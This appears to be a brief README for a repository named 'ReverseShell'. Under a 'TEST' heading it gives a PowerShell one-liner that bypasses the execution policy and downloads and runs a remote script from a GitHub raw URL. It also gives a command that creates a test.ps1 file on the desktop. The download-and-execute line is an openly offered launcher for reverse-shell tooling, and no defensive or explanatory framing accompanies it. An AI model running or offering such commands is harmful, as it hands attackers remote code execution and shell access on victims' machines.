# ReverseShell
TEST
```
powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/serainox420/ReverseShell/personal/test.ps1'))"
```

Create new ps1 script
```
powershell -Command "New-Item -Path $env:USERPROFILE\Desktop\test.ps1 -ItemType File"
```
